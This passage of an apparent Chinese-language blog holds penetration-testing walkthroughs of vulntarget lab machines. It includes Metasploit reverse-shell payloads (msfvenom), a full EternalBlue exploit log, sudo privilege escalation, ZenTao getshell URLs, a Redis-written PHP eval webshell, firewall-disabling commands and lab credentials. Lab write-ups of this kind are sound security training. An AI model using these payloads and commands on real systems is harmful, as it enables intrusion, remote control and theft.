                     le on</span><br><span class="line">   SHOWDESCRIPTION  false            yes       Displays a detailed descript</span><br><span class="line">                                               ion for the available exploi</span><br><span class="line">                                               ts</span><br><span class="line"></span><br><span class="line">msf6 post(multi/recon/local_exploit_suggester) &gt; sessions </span><br><span class="line"></span><br><span class="line">Active sessions</span><br><span class="line">===============</span><br><span class="line"></span><br><span class="line">  Id  Name  Type                 Information           Connection</span><br><span class="line">  --  ----  ----                 -----------           ----------</span><br><span class="line">  2         meterpreter x64/lin  www @ localhost.loca  10.10.10.114:3344 -&gt;</span><br><span class="line">            ux                   ldomain (uid=1001, g   10.10.10.134:43556</span><br><span class="line">                                 id=1001, euid=1001,   (10.10.10.134)</span><br><span class="line">                                 egid=1001) @ loca...</span><br><span class="line"></span><br><span class="line">msf6 post(multi/recon/local_exploit_suggester) &gt; set session 2</span><br><span class="line">session =&gt; 2</span><br><span class="line">msf6 post(multi/recon/local_exploit_suggester) &gt; exploit </span><br><span class="line"></span><br><span class="line">[*] 10.10.10.134 - Collecting local exploits for x64/linux...</span><br><span class="line">[*] 10.10.10.134 - 41 exploit checks are being tried...</span><br><span class="line">[+] 10.10.10.134 - exploit/linux/local/network_manager_vpnc_username_priv_esc: The service is running, but could not be validated.</span><br><span class="line">[+] 10.10.10.134 - exploit/linux/local/ptrace_traceme_pkexec_helper: The target appears to be vulnerable.</span><br><span class="line">[+] 10.10.10.134 - exploit/linux/local/sudo_baron_samedit: The target appears to be vulnerable. sudo 1.8.23 is a vulnerable build.</span><br><span class="line">[*] Post module execution completed</span><br><span class="line">msf6 post(multi/recon/local_exploit_suggester) &gt; </span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>这个pkexec 刚才试过了没成功，试一下sudo的这个</p>
<p><img src="/posts/f33996e/18.png"></p>
<p><img src="/posts/f33996e/19.png"></p>
<p><img src="/posts/f33996e/20.png"></p>
<p>运行完成后可看到生成了一个新的root账户<code>msf</code> 密码为 <code>nyyqeegzvjyfqa</code> ssh连一下试试  </p>
<p>然后成功连上ssh 权限为root权限 </p>
<p><img src="/posts/f33996e/21.png" alt="截图"></p>
<p>在root目录下发现了一个flag</p>
<p><img src="/posts/f33996e/22.png" alt="截图"></p>
<h3 id="横向第二台机器"><a href="#横向第二台机器" class="headerlink" title="横向第二台机器"></a>横向第二台机器</h3><p>直接上msf</p>
<p><code>msfvenom -p linux/x64/meterpreter/reverse_tcp lhost=10.10.10.114 lport=3344 -f elf &gt; 3344.elf</code></p>
<p><img src="/posts/f33996e/13.png" alt="截图"></p>
<br>

<p>发现有两个网卡，一个网段为<code>10.10.10.0/24</code> (公网ip为 10.10.10.134)</p>
<p>另一个为 <code>10.0.20.0/24</code> (内网ip为10.0.20.30)</p>
<h4 id="添加路由"><a href="#添加路由" class="headerlink" title="添加路由"></a>添加路由</h4><p><code>meterpreter &gt;  run post/multi/manage/autoroute</code></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">[!] SESSION may not be compatible with this module (incompatible session platform: linux)                                                                 </span><br><span class="line">[*] Running module against localhost.localdomain                             </span><br><span class="line">[*] Searching for subnets to autoroute.                                      </span><br><span class="line">[+] Route added to subnet 10.0.20.0/255.255.255.0 from host&#x27;s routing table. </span><br><span class="line">[+] Route added to subnet 10.10.10.0/255.255.255.0 from host&#x27;s routing table.</span><br></pre></td></tr></table></figure>

<h4 id="端口扫描-1"><a href="#端口扫描-1" class="headerlink" title="端口扫描"></a>端口扫描</h4><p><img src="/posts/f33996e/14.png" alt="截图">         </p>
<p>(扫了好久没扫到，突然想到机器忘记开了…离谱)</p>
<p>直接挂代理 用proxychains扫</p>
<p><img src="/posts/f33996e/15.png" alt="截图"></p>
<p>刚才用msf的portscan只扫到8080，用nmap扫一下</p>
<p><code>proxychains nmap -sV 10.0.20.66</code> 扫了20分钟</p>
<p><img src="/posts/f33996e/16.png" alt="截图"></p>
<p>又发现了3306端口</p>
<br>

<p>然后使用浏览器挂代理访问 10.0.20.66:8080 是个禅道cms</p>
<p><img src="/posts/f33996e/17.png" alt="截图"></p>
<p>查看源码 发现是 禅道v12.4.2 找下对应漏洞</p>
<p>下班了 早点回去 明天再搞…</p>
<hr>
<p>在网上找了下 只找到了该版本的后台getshell，只能尝试弱口令登录后台了…</p>
<p><img src="/posts/f33996e/23.png" alt="截图"></p>
<p>尝试5次自动锁了…然后我看了下wp,发现账号密码是 <code>admin</code>/<code>Admin123</code> 然后去试还是登录失败…(本地没登上去 kali登上去了 无语…)</p>
<h4 id="ZenTao-后台getshell-失败"><a href="#ZenTao-后台getshell-失败" class="headerlink" title="ZenTao 后台getshell(失败)"></a>ZenTao 后台getshell(失败)</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">### Exp</span><br><span class="line">http://127.0.0.1/zentao/client-download-1-&lt;base64 encode webshell download link&gt;-1.html</span><br><span class="line">http://127.0.0.1/zentao/data/client/1/&lt;download link filename&gt;</span><br></pre></td></tr></table></figure>

<p> 需要在外网机器上起一个ftp服务 </p>
<p><code>python -m pyftpdlib -p 21 -d .</code> 但是现在是普通用户 不知道权限够不够</p>
<p>蚁剑传一个shell.php的一句话 </p>
<p>shell地址 <code>ftp://10.0.20.30/shell.php</code>   </p>
<p>base64 <code>ZnRwOi8vMTAuMC4yMC4zMC9zaGVsbC5waHA=</code></p>
<p>构建exp </p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://10.0.20.66:8080/client-download-1-ZnRwOi8vMTAuMC4yMC4zMC9zaGVsbC5waHA==-1.html</span><br></pre></td></tr></table></figure>

<p>访问后404 应该是外网机器权限太低 需要提权一下，再回到外网机器进行提权</p>
<br>

<hr>
<p>提到root后 再回来打这个exp 打算起一个ftp服务 但是没有这个库 而且也没安装pip </p>
<p>那就考虑使用http去搞</p>
<p>shell地址 <code>http://10.0.20.30:6688/shell.php</code></p>
<p>base64 <code>aHR0cDovLzEwLjAuMjAuMzA6NjY4OC9zaGVsbC5waHA=</code></p>
<p>构造exp <code>http://10.0.20.66:8080/index.php?m=client&amp;f=download&amp;version=1&amp;link=aHR0cDovLzEwLjAuMjAuMzA6NjY4OC9zaGVsbC5waHA=</code></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://10.0.20.66:8080/index.php?m=client&amp;f=download&amp;version=1&amp;link=aHR0cDovLzEwLjAuMjAuMzA6NjY4OC9zaGVsbC5waHA=  </span><br><span class="line"># 第一个直接404</span><br><span class="line">http://10.0.20.66:8080/index.php?m=client&amp;f=download&amp;version=1&amp;link=MTAuMC4yMC4zMDo5Njk2L3NoZWxsLnBocA==</span><br><span class="line"></span><br><span class="line">http://10.0.20.66:8080/index.php?m=client&amp;f=download&amp;version=1&amp;link=MTAuMC4yMC4zMDozMzIxL3NoZWxsLnBocA==</span><br><span class="line"></span><br><span class="line">http://10.0.20.66:8080/client-download-1-SFRUUDovLzEwLjAuMjAuMzM6NDU2Ny8xLnBocA==-1.html</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">http://10.0.20.66:8080/index.php?m=client&amp;f=download&amp;version=1&amp;link=MTAuMC4yMC4zMDozMzIxL3NoZWxsLnBocA==</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">http://10.0.20.66:8080/client-download-1-MTAuMC4yMC4zMDozMzIxL3NoZWxsLnBocA==-1.html  404</span><br><span class="line">http://127.0.0.1/zentao/data/client/1/shell.php</span><br><span class="line"></span><br><span class="line">大写HTTP</span><br><span class="line"></span><br><span class="line">SFRUUDovLzEwLjAuMjAuMzA6MzMyMS9zaGVsbC5waHA=</span><br><span class="line">http://10.0.20.66:8080/index.php?m=client&amp;f=download&amp;version=1&amp;link=SFRUUDovLzEwLjAuMjAuMzA6MzMyMS9zaGVsbC5waHA=</span><br><span class="line"></span><br><span class="line">HTTP://10.0.20.30:3321/shell.php</span><br><span class="line">SFRUUDovLzEwLjAuMjAuMzA6MzMyMS9zaGVsbC5waHA=</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">http://10.0.20.30:3300/1.txt</span><br><span class="line"></span><br><span class="line">http://10.0.20.66:8080/index.php?m=client&amp;f=download&amp;version=1&amp;link=aHR0cDovLzEwLjAuMjAuMzA6MzMwMC8xLnR4dA==</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">aHR0cDovLzEwLjAuMjAuMzA6MzMwMC8xLnR4dA==</span><br><span class="line">http://10.0.20.66:8080/index.php?m=client&amp;f=download&amp;version=1&amp;link=aHR0cDovLzEwLjAuMjAuMzA6MzMwMC8xLnR4dA==</span><br><span class="line"></span><br></pre></td></tr></table></figure>



<p>尝试了好多次，只会创建一个空的shell.php 下载一句话一直失败 传不上去，然后后续我就在靶机上自行创建了一个一句话，然后访问页面可以正常访问，但是去连蚁剑啥的都连不上……无语</p>
<p>基本上是第二台靶机的问题了，后面的就没法再继续下去了… </p>
<h3 id="References"><a href="#References" class="headerlink" title="References"></a>References</h3><p><a href="https://n0puple.github.io/2021/07/06/%E6%9E%81%E8%87%B4cms1-7-%E5%90%8E%E5%8F%B0%E4%B8%A4%E5%A4%84getshell/">https://n0puple.github.io/2021/07/06/%E6%9E%81%E8%87%B4cms1-7-%E5%90%8E%E5%8F%B0%E4%B8%A4%E5%A4%84getshell/</a></p>
]]></content>
  </entry>
  <entry>
    <title>vulntarget-a靶机</title>
    <url>/posts/3edb83f3/</url>
    <content><![CDATA[<h3 id="References"><a href="#References" class="headerlink" title="References"></a>References</h3><blockquote>
<p><a href="https://mp.weixin.qq.com/s/uxwbnVOxkR8OBkkY9WW6aQ">https://mp.weixin.qq.com/s/uxwbnVOxkR8OBkkY9WW6aQ</a><br><a href="https://www.cnnews.today/showArticle?main_id=b3613271ffe35b6fd924822459c9ef36&amp;language=cht">https://www.cnnews.today/showArticle?main_id=b3613271ffe35b6fd924822459c9ef36&amp;language=cht</a></p>
</blockquote>
<h3 id="拓扑图"><a href="#拓扑图" class="headerlink" title="拓扑图"></a>拓扑图</h3><p><img src="/posts/3edb83f3/1.png"></p>
<p>（直接在crow那个拿过来的）</p>
<h3 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h3><h4 id="域控-2019"><a href="#域控-2019" class="headerlink" title="域控 2019"></a>域控 2019</h4><p>administrator / Admin@666</p>
<p>IP 10.0.10.110</p>
<h4 id="外网机器-win7"><a href="#外网机器-win7" class="headerlink" title="外网机器 win7"></a>外网机器 win7</h4><p>win7 / admin</p>
<p>IP 192.168.0.133 / 10.0.20.98</p>
<h4 id="域内用户-2016"><a href="#域内用户-2016" class="headerlink" title="域内用户 2016"></a>域内用户 2016</h4><p>Administrator / Admin@123</p>
<p>balsec.com\win2016 / Admin#123</p>
<p>IP 10.0.10.111 / 10.0.20.99</p>
<br>

<h3 id="外网打点"><a href="#外网打点" class="headerlink" title="外网打点"></a>外网打点</h3><p>外网机器是一台win7 已知IP为 10.10.10.248</p>
<h4 id="端口扫描"><a href="#端口扫描" class="headerlink" title="端口扫描"></a>端口扫描</h4><p>先用nmap扫一下 发现就一个80 web端口</p>
<p><img src="/posts/3edb83f3/2.png" alt="截图"></p>
<h4 id="通达OA-Getshell"><a href="#通达OA-Getshell" class="headerlink" title="通达OA Getshell"></a>通达OA Getshell</h4><p>10.10.10.248 主页是一台通达OA 直接使用工具梭哈</p>
<p><img src="/posts/3edb83f3/3.png" alt="截图"></p>
<p>连接蚁剑</p>
<p>执行<code>whoami</code> 直接是system权限</p>
<p><img src="/posts/3edb83f3/4.png" alt="截图"></p>
<p>然后 <code>systeminfo</code> <code>ipconfig /all</code></p>
<p>发现有两张网卡 不在域内</p>
<p><img src="/posts/3edb83f3/5.png" alt="截图"></p>
<br>

<p>这里直接上CS</p>
<p>本想直接从cs 转到msf，一直连不上换payload也不行，就直接上个msf马</p>
<p><code>msfvenom -p windows/meterpreter/reverse_tcp lhost=10.10.10.114 lport=8888 -f exe &gt; shell.exe</code></p>
<br>

<h4 id="ms17-010利用"><a href="#ms17-010利用" class="headerlink" title="ms17-010利用"></a>ms17-010利用</h4><p>这里的win7也存在ms17010漏洞 成功拿到</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line">msf6 auxiliary(server/socks_proxy) &gt; use auxiliary/scanner/smb/smb_ms17_010 </span><br><span class="line">sf6 auxiliary(scanner/smb/smb_ms17_010) &gt; set rhosts 10.10.10.248</span><br><span class="line">rhosts =&gt; 10.10.10.248</span><br><span class="line">msf6 auxiliary(scanner/smb/smb_ms17_010) &gt; exploit </span><br><span class="line"></span><br><span class="line">[+] 10.10.10.248:445      - Host is likely VULNERABLE to MS17-010! - Windows 7 Professional 7601 Service Pack 1 x64 (64-bit)</span><br><span class="line">[*] 10.10.10.248:445      - Scanned 1 of 1 hosts (100% complete)</span><br><span class="line">[*] Auxiliary module execution completed</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">msf6 auxiliary(scanner/smb/smb_ms17_010) &gt; use exploit/windows/smb/ms17_010_eternalblue </span><br><span class="line">msf6 exploit(windows/smb/ms17_010_eternalblue) &gt; set rhosts 10.10.10.248</span><br><span class="line">rhosts =&gt; 10.10.10.248</span><br><span class="line">msf6 exploit(windows/smb/ms17_010_eternalblue) &gt; exploit </span><br><span class="line"></span><br><span class="line">[*] Started reverse TCP handler on 10.10.10.114:4444 </span><br><span class="line">[*] 10.10.10.248:445 - Using auxiliary/scanner/smb/smb_ms17_010 as check</span><br><span class="line">[+] 10.10.10.248:445      - Host is likely VULNERABLE to MS17-010! - Windows 7 Professional 7601 Service Pack 1 x64 (64-bit)</span><br><span class="line">[*] 10.10.10.248:445      - Scanned 1 of 1 hosts (100% complete)</span><br><span class="line">[+] 10.10.10.248:445 - The target is vulnerable.</span><br><span class="line">[*] 10.10.10.248:445 - Connecting to target for exploitation.</span><br><span class="line">[+] 10.10.10.248:445 - Connection established for exploitation.</span><br><span class="line">[+] 10.10.10.248:445 - Target OS selected valid for OS indicated by SMB reply</span><br><span class="line">[*] 10.10.10.248:445 - CORE raw buffer dump (42 bytes)</span><br><span class="line">[*] 10.10.10.248:445 - 0x00000000  57 69 6e 64 6f 77 73 20 37 20 50 72 6f 66 65 73  Windows 7 Profes</span><br><span class="line">[*] 10.10.10.248:445 - 0x00000010  73 69 6f 6e 61 6c 20 37 36 30 31 20 53 65 72 76  sional 7601 Serv</span><br><span class="line">[*] 10.10.10.248:445 - 0x00000020  69 63 65 20 50 61 63 6b 20 31                    ice Pack 1      </span><br><span class="line">[+] 10.10.10.248:445 - Target arch selected valid for arch indicated by DCE/RPC reply</span><br><span class="line">[*] 10.10.10.248:445 - Trying exploit with 12 Groom Allocations.</span><br><span class="line">[*] 10.10.10.248:445 - Sending all but last fragment of exploit packet</span><br><span class="line">[*] 10.10.10.248:445 - Starting non-paged pool grooming</span><br><span class="line">[+] 10.10.10.248:445 - Sending SMBv2 buffers</span><br><span class="line">[+] 10.10.10.248:445 - Closing SMBv1 connection creating free hole adjacent to SMBv2 buffer.</span><br><span class="line">[*] 10.10.10.248:445 - Sending final SMBv2 buffers.</span><br><span class="line">[*] 10.10.10.248:445 - Sending last fragment of exploit packet!</span><br><span class="line">[*] 10.10.10.248:445 - Receiving response from exploit packet</span><br><span class="line">[+] 10.10.10.248:445 - ETERNALBLUE overwrite completed successfully (0xC000000D)!</span><br><span class="line">[*] 10.10.10.248:445 - Sending egg to corrupted connection.</span><br><span class="line">[*] 10.10.10.248:445 - Triggering free of corrupted buffer.</span><br><span class="line">[*] Sending stage (200262 bytes) to 10.10.10.248</span><br><span class="line">[*] Meterpreter session 2 opened (10.10.10.114:4444 -&gt; 10.10.10.248:50270) at 2022-03-22 02:50:35 -0400</span><br><span class="line">[+] 10.10.10.248:445 - =-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=</span><br><span class="line">[+] 10.10.10.248:445 - =-=-=-=-=-=-=-=-=-=-=-=-=-WIN-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=</span><br><span class="line">[+] 10.10.10.248:445 - =-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=</span><br><span class="line"></span><br><span class="line">meterpreter &gt; getuid</span><br><span class="line">Server username: NT AUTHORITY\SYSTEM</span><br><span class="line">meterpreter &gt; sysinfo</span><br><span class="line">Computer        : WIN7-PC</span><br><span class="line">OS              : Windows 7 (6.1 Build 7601, Service Pack 1).</span><br><span class="line">Architecture    : x64</span><br><span class="line">System Language : zh_CN</span><br><span class="line">Domain          : WORKGROUP</span><br><span class="line">Logged On Users : 2</span><br><span class="line">Meterpreter     : x64/windows</span><br><span class="line">meterpreter &gt; </span><br><span class="line"></span><br><span class="line">meterpreter &gt; ipconfig</span><br><span class="line"></span><br><span class="line">Interface  1</span><br><span class="line">============</span><br><span class="line">Name         : Software Loopback Interface 1</span><br><span class="line">Hardware MAC : 00:00:00:00:00:00</span><br><span class="line">MTU          : 4294967295</span><br><span class="line">IPv4 Address : 127.0.0.1</span><br><span class="line">IPv4 Netmask : 255.0.0.0</span><br><span class="line">IPv6 Address : ::1</span><br><span class="line">IPv6 Netmask : ffff:ffff:ffff:ffff:ffff:ffff:ffff:ffff</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Interface 11</span><br><span class="line">============</span><br><span class="line">Name         : Intel(R) PRO/1000 MT Network Connection</span><br><span class="line">Hardware MAC : 00:0c:29:f6:6a:05</span><br><span class="line">MTU          : 1500</span><br><span class="line">IPv4 Address : 10.10.10.248</span><br><span class="line">IPv4 Netmask : 255.255.255.0</span><br><span class="line">IPv6 Address : fe80::2de1:362a:d91a:ed60</span><br><span class="line">IPv6 Netmask : ffff:ffff:ffff:ffff::</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Interface 13</span><br><span class="line">============</span><br><span class="line">Name         : Intel(R) PRO/1000 MT Network Connection #2</span><br><span class="line">Hardware MAC : 00:0c:29:f6:6a:0f</span><br><span class="line">MTU          : 1500</span><br><span class="line">IPv4 Address : 10.0.20.98</span><br><span class="line">IPv4 Netmask : 255.255.255.0</span><br><span class="line">IPv6 Address : fe80::5146:76d1:7288:d8be</span><br><span class="line">IPv6 Netmask : ffff:ffff:ffff:ffff::</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Interface 17</span><br><span class="line">============</span><br><span class="line">Name         : Microsoft ISATAP Adapter #3</span><br><span class="line">Hardware MAC : 00:00:00:00:00:00</span><br><span class="line">MTU          : 1280</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Interface 25</span><br><span class="line">============</span><br><span class="line">Name         : Microsoft ISATAP Adapter #4</span><br><span class="line">Hardware MAC : 00:00:00:00:00:00</span><br><span class="line">MTU          : 1280</span><br><span class="line">IPv6 Address : fe80::5efe:a0a:af8</span><br><span class="line">IPv6 Netmask : ffff:ffff:ffff:ffff:ffff:ffff:ffff:ffff</span><br><span class="line"></span><br><span class="line">meterpreter &gt; arp</span><br><span class="line"></span><br><span class="line">ARP cache</span><br><span class="line">=========</span><br><span class="line"></span><br><span class="line">    IP address       MAC address        Interface</span><br><span class="line">    ----------       -----------        ---------</span><br><span class="line">    10.0.20.255      ff:ff:ff:ff:ff:ff  13</span><br><span class="line">    10.10.10.1       fc:7c:02:73:a5:40  11</span><br><span class="line">    10.10.10.114     34:e1:2d:a3:ac:4b  11</span><br><span class="line">    10.10.10.255     ff:ff:ff:ff:ff:ff  11</span><br><span class="line">    224.0.0.2        00:00:00:00:00:00  1</span><br><span class="line">    224.0.0.2        01:00:5e:00:00:02  11</span><br><span class="line">    224.0.0.2        01:00:5e:00:00:02  13</span><br><span class="line">    224.0.0.22       00:00:00:00:00:00  1</span><br><span class="line">    224.0.0.22       01:00:5e:00:00:16  11</span><br><span class="line">    224.0.0.22       01:00:5e:00:00:16  13</span><br><span class="line">    224.0.0.252      00:00:00:00:00:00  1</span><br><span class="line">    224.0.0.252      01:00:5e:00:00:fc  11</span><br><span class="line">    224.0.0.252      01:00:5e:00:00:fc  13</span><br><span class="line">    239.255.255.250  00:00:00:00:00:00  1</span><br><span class="line">    239.255.255.250  01:00:5e:7f:ff:fa  11</span><br><span class="line">    255.255.255.255  ff:ff:ff:ff:ff:ff  11</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>看到存在两个网卡 另一个网段为 <code>10.0.20.0/24</code></p>
<p>然后去迁移进程 添加路由</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">meterpreter &gt; run post/windows/manage/migrate </span><br><span class="line"></span><br><span class="line">[!] SESSION may not be compatible with this module (missing Meterpreter features: stdapi_sys_process_set_term_size)</span><br><span class="line">[*] Running module against WIN7-PC</span><br><span class="line">[*] Current server process: spoolsv.exe (1140)</span><br><span class="line">[*] Spawning notepad.exe process to migrate into</span><br><span class="line">[*] Spoofing PPID 0</span><br><span class="line">[*] Migrating into 3200</span><br><span class="line">[+] Successfully migrated into process 3200</span><br><span class="line">meterpreter &gt; run post/multi/manage/autoroute </span><br><span class="line"></span><br><span class="line">[!] SESSION may not be compatible with this module (incompatible session platform: windows)</span><br><span class="line">[*] Running module against WIN7-PC</span><br><span class="line">[*] Searching for subnets to autoroute.</span><br><span class="line">[+] Route added to subnet 10.0.20.0/255.255.255.0 from host&#x27;s routing table.</span><br><span class="line">[+] Route added to subnet 10.10.10.0/255.255.255.0 from host&#x27;s routing table.</span><br><span class="line">meterpreter &gt; </span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p><code>route print</code> 查看路由</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">msf6 post(multi/manage/autoroute) &gt; route print</span><br><span class="line"></span><br><span class="line">IPv4 Active Routing Table</span><br><span class="line">=========================</span><br><span class="line"></span><br><span class="line">   Subnet             Netmask            Gateway</span><br><span class="line">   ------             -------            -------</span><br><span class="line">   10.0.20.0          255.255.255.0      Session 2</span><br><span class="line">   10.10.10.0         255.255.255.0      Session 2</span><br><span class="line"></span><br><span class="line">[*] There are currently no IPv6 routes defined.</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>然后使用msf 端口扫描模块</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">msf6 exploit(windows/smb/ms17_010_eternalblue) &gt; use auxiliary/scanner/portscan/tcp</span><br><span class="line">msf6 auxiliary(scanner/portscan/tcp) &gt; set ports 22,23,80,443,8000,8080,8081,3389,143,445,6379,7001,7002,1433</span><br><span class="line">ports =&gt; 22,23,80,443,8000,8080,8081,3389,143,445,6379,7001,7002,1433</span><br><span class="line">msf6 auxiliary(scanner/portscan/tcp) &gt; set rhosts 10.0.20.0/24</span><br><span class="line">rhosts =&gt; 10.0.20.0/24</span><br><span class="line">msf6 auxiliary(scanner/portscan/tcp) &gt; set threads 20</span><br><span class="line">threads =&gt; 20</span><br><span class="line">msf6 auxiliary(scanner/portscan/tcp) &gt; exploit </span><br><span class="line"></span><br><span class="line">[+] 10.0.20.1:            - 10.0.20.1:445 - TCP OPEN</span><br><span class="line">[+] 10.0.20.1:            - 10.0.20.1:3389 - TCP OPEN</span><br><span class="line"></span><br><span class="line">[*] 10.0.20.0/24:         - Scanned  26 of 256 hosts (10% complete)</span><br><span class="line">[*] 10.0.20.0/24:         - Scanned  56 of 256 hosts (21% complete)</span><br><span class="line">[*] 10.0.20.0/24:         - Scanned  79 of 256 hosts (30% complete)</span><br><span class="line">[+] 10.0.20.98:           - 10.0.20.98:80 - TCP OPEN</span><br><span class="line">[+] 10.0.20.98:           - 10.0.20.98:445 - TCP OPEN</span><br><span class="line">[+] 10.0.20.99:           - 10.0.20.99:80 - TCP OPEN</span><br><span class="line">[+] 10.0.20.99:           - 10.0.20.99:6379 - TCP OPEN</span><br><span class="line">[*] 10.0.20.0/24:         - Scanned 103 of 256 hosts (40% complete)</span><br><span class="line">[*] 10.0.20.0/24:         - Scanned 129 of 256 hosts (50% complete)</span><br><span class="line">[*] 10.0.20.0/24:         - Scanned 158 of 256 hosts (61% complete)</span><br><span class="line">[*] 10.0.20.0/24:         - Scanned 180 of 256 hosts (70% complete)</span><br><span class="line">[*] 10.0.20.0/24:         - Scanned 207 of 256 hosts (80% complete)</span><br><span class="line">[*] 10.0.20.0/24:         - Scanned 233 of 256 hosts (91% complete)</span><br><span class="line">[*] 10.0.20.0/24:         - Scanned 256 of 256 hosts (100% complete)</span><br><span class="line">[*] Auxiliary module execution completed</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>扫到两台机器  98是拿到的外网win7  99是这个网段的另一台机器</p>
<br>

<p>这里设置个代理(之前我都是手动去配路由 没用过这个在msf session中自动配的  然后就手动去配的 结果都是启动就结束 然后我自己再去proxychain 连127.0.0.1:1080发现自动路由那里已经给配置好了…) </p>
<br>

<h3 id="横向第二台机器"><a href="#横向第二台机器" class="headerlink" title="横向第二台机器"></a>横向第二台机器</h3><p>99这台机器开放了80端口和6379端口 可测试下是否存在redis未授权</p>
<p>先用dirb 去扫一下80端口的目录 dirb太慢了 没打扫到啥换dirsearch </p>
<p><code>proxychain python3 dirsearch.py -u http://10.0.20.99</code></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">403   225B   http://10.0.20.99:80/Trace.axd::$DATA</span><br><span class="line">200    11B   http://10.0.20.99:80/index.php</span><br><span class="line">200    11B   http://10.0.20.99:80/index.pHp</span><br><span class="line">200    11B   http://10.0.20.99:80/index.php.</span><br><span class="line">200    11B   http://10.0.20.99:80/index.php/login/</span><br><span class="line">403   225B   http://10.0.20.99:80/index.php::$DATA</span><br><span class="line">200    14KB  http://10.0.20.99:80/l.php</span><br><span class="line">200    70KB  http://10.0.20.99:80/phpinfo.php</span><br><span class="line">403   226B   http://10.0.20.99:80/web.config::$DATA</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>只有l.php 和 phpinfo有点信息 l.php是一个探针</p>
<p><img src="/posts/3edb83f3/6.png" alt="截图"></p>
<p><img src="/posts/3edb83f3/7.png" alt="截图"></p>
<p>通过探针可用发现是使用phpstudy搭建的，绝对路径为<code> C:/phpStudy/PHPTutorial/WWW</code> </p>
<h5 id="CS建立socks4代理"><a href="#CS建立socks4代理" class="headerlink" title="CS建立socks4代理"></a>CS建立socks4代理</h5><p>这里也可以使用cs的代理去访问web服务</p>
<p>右键拿到权限的主机 —&gt; Pivoting —&gt; Socks Server</p>
<p>然后会生成一个随机未占用的端口，点击启动即可</p>
<p><img src="/posts/3edb83f3/8.png" alt="截图"></p>
<p>然后使用代理 连接 socks4 CSip 和这个端口即可</p>
<p>（也可以使用前面msf起的代理）</p>
<br>

<h4 id="Redis未授权getshell"><a href="#Redis未授权getshell" class="headerlink" title="Redis未授权getshell"></a>Redis未授权getshell</h4><p>没啥利用点，那就去考虑 6379的redis了</p>
<p><code>proxychains redis-cli -h 10.0.20.99</code> 发现未授权</p>
<p>可直接写一个webshell 然后去连接</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">10.0.20.99:6379&gt; config set dir &quot;C:/phpStudy/PHPTutorial/WWW&quot;</span><br><span class="line">OK</span><br><span class="line">10.0.20.99:6379&gt; config set dbfilename shell.php</span><br><span class="line">OK</span><br><span class="line">10.0.20.99:6379&gt; set webshell &quot;&lt;?php @eval($_REQUEST[&#x27;ant&#x27;]);?&gt;&quot;</span><br><span class="line">OK</span><br><span class="line">10.0.20.99:6379&gt; save</span><br><span class="line">OK</span><br><span class="line">10.0.20.99:6379&gt; </span><br></pre></td></tr></table></figure>

<p>能写入但是没法连上蚁剑… … </p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">10.0.20.99:6379&gt; config set dir &quot;C:/phpStudy/PHPTutorial/WWW&quot;</span><br><span class="line">OK</span><br><span class="line">10.0.20.99:6379&gt; config set dbfilename info.php</span><br><span class="line">OK</span><br><span class="line">10.0.20.99:6379&gt; set webshell &quot;&lt;?php phpinfo();?&gt;&quot;</span><br><span class="line">OK</span><br><span class="line">10.0.20.99:6379&gt; save</span><br><span class="line">OK</span><br></pre></td></tr></table></figure>

<p>写一个phpinfo也没啥问题 那基本可以确定是蚁剑代理的问题了</p>
<p><img src="/posts/3edb83f3/9.png" alt="截图"></p>
<br>

<p>使用蚁剑自身代理没连上，使用socksCap也没连上，使用proxifier就成功连上了….</p>
<p><img src="/posts/3edb83f3/10.png" alt="截图"></p>
<br>

<p><code>whomai </code> 得到也是system权限</p>
<p><code>systeminfo</code>  得到域信息和两张网卡</p>
<p><img src="/posts/3edb83f3/11.png" alt="截图"></p>
<p>域名为 <code>vulntarget.com</code>  一张网卡为 <code>10.0.20.0/24</code> 属于dmz区的网段</p>
<p>然后<code>10.0.10.0/24</code> 基本上可以判定为是域网段</p>
<p>然后查一下杀软 <code>tasklist -svc</code></p>
<p><img src="/posts/3edb83f3/12.png" alt="截图"></p>
<p>存在WinDef</p>
<p>生成一个马 再还没被杀的时候 也连不上，估计是开了防火墙</p>
<p><code>netsh advfirewall show allprofiles</code> 查看防火墙状态</p>
<p><img src="/posts/3edb83f3/13.png" alt="截图"></p>
<p>一顿乱码，先去改一下编码方式 改成gbk后就可以了</p>
<p><img src="/posts/3edb83f3/14.png" alt="截图"></p>
<br>

<p><code>netsh advfirewall set allprofiles state off</code> 关闭防火墙(这里是system权限 直接就可关闭)</p>
<p><img src="/posts/3edb83f3/15.png" alt="截图"></p>
<br>

<h4 id="CS端口转发尝试上线win2016"><a href="#CS端口转发尝试上线win2016" class="headerlink" title="CS端口转发尝试上线win2016"></a>CS端口转发尝试上线win2016</h4><p>然后尝试使用之前的外网win7的cs beacon 代理连到win2016上</p>
